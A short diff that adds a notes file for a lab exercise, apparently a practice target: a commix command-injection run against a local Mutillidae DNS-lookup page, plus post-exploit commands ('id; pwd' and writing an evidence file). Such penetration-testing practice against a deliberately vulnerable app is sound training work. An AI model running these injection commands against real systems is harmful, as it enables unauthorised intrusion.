@@ -1,0 +1,7 @@
+# commix with POST and retrieval of OS-relevant info
+commix -u "http://localhost/mutillidae/index.php?page=dns-lookup.php" --data="target_host=123&dns-lookup-php-submit-button=Lookup+DNS" --all
+
+# post-exploit commands
+id; pwd;
+echo "evidencecookie" > evidence.txt
+
